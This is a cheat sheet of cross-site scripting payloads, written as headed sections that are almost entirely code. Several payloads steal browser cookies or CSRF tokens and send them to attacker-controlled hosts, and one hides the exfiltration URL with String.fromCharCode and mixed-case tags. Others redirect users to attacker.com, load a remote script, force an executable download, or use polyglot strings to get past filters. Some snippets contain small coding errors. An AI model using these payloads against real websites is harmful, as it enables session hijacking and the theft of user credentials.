**JavaScript Code to Capture Cookies**
- The following JavaScript code captures and sends the user's cookies to an attacker's server:

```javascript
<script>
  image = new Image();
  image.src='http://attacker_server_ip/?c='+document.cookie;
</script>
```

**Image Tag with Alert**
- An `img` tag that triggers an alert when the image is loaded:

```html
<img onload=alert('The image has been loaded!') src="example.png">
```

**JavaScript XSS in Syncs**
- JavaScript XSS payload that triggers an alert:

```javascript
javascript:alert('XSS by you')
```

**Data Field Encoded Payload**
- A data field encoded payload that triggers an alert when accessed via a URL:

```html
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFZpY2tpZScpPC9zY3JpcHQ+"
```

- Triggered by:
  ```
  https://example.com/upload_profile_pic?url=IMAGE_URL
  ```

**Location Change Script**
- A script that changes the user's location to an attacker's website:

```html
/><script>location="http://attacker.com";</script>
```

**Additional XSS Payloads**
- Various XSS payloads:

```html
<script>alert(1)</script>
<iframe src=javascript:alert(1)>
<body onload=alert(1)>
"><img src=x onerror=prompt(1);>
<script>alert(1)<!– <!-
<a onmouseover"alert(1)">test</a>
<script src=//attacker.com/test.js>
```

**XSS Bypasses**
- Examples of XSS polyglots:

```javascript
javascript:"/*\"/*`/*' /*</template>
</textarea></noembed></noscript></title>
</style></script-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
```

- Use the following link to access XSS polyglots:
  [Polyglot Examples](https://web.archive.org/web/20190617111911/https://polyglot.innerht.ml/)

**HREF Tag XSS**
- An example of an XSS payload using an `<a>` tag:

```html
<a href="javascript:alert('XSS by Vickie')">Click me!</a>
```

**Capitalization in XSS**
- An example of using capitalization to obfuscate an XSS payload:

```html
<scrIPT>location='http://attacker_server_ip/c='+document.cookie;</scrIPT>
```

- Alternatively, you can use the JavaScript `String.fromCharCode()` function to create the string you need:

```html
<scrIPT>location=String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookie;</scrIPT>
```

**Stealing CSRF Tokens**
- A script to steal CSRF tokens by using an XMLHttpRequest:

```javascript
var token = document.getElementsById('csrf-token')[0];
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://attacker_server_ip/?token="+token, true);
xhr.send(null);
```

**Cookie Stealing XSS**
- A script to steal cookies and send them to an attacker's server:

```html
<script>
  document.write('<img src="http://<Your IP>/Stealer.php?cookie=' + document.cookie + '" >');
</script>
```

**Forcing File Download**
- A script to force the download of a file:

```html
<script>
  var link = document.createElement('a');
  link.href = 'http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe';
  link.download = '';
  document.body.appendChild(link);
  link.click();
</script>
```

**User Redirect Script**
- A script to redirect the user to a specific URL:

```html
<script>
  window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
</script>
```

**Escalating XSS**
- A link to a resource discussing how to escalate XSS attacks:
  [XSS Escalation Resource](https://branch-delivery-7d5.notion.site/xss-dd37aad820b14535a3b3b418345d9d1f)
